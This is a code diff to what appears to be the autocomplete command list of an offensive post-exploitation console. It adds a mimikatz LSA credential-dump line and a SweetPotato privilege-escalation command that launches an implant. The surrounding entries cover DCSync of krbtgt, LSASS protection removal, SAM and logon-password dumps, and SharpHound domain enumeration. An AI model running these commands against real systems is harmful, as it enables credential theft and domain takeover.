@@ -269,6 +269,7 @@ completerData = [
                             ('mimikatz.exe',[
                                 ('"!+" "!processprotect /process:lsass.exe /remove" "privilege::debug" "exit"',[]),
                                 ('"privilege::debug" "lsadump::dcsync /domain:m3c.local /user:krbtgt" "exit"',[]),
+                                ('"privilege::debug" "lsadump::lsa /inject /name:joe" "exit"',[]),
                                 ('"sekurlsa::logonpasswords" "exit"',  []),
                                 ('"sekurlsa::ekeys" "exit"',  []),
                                 ('"lsadump::sam" "exit"',  []),
@@ -292,6 +293,7 @@ completerData = [
                                 ('-group=user',[]),
                             ]),
                             ('SharpHound.exe -c All -d dev.admin.offshore.com',  []),
+                            ('SweetPotato.exe -e EfsRpc -p C:\Users\Public\Documents\implant.exe"',  []),
                         ]),
                     ]),
     ('upload',[]),
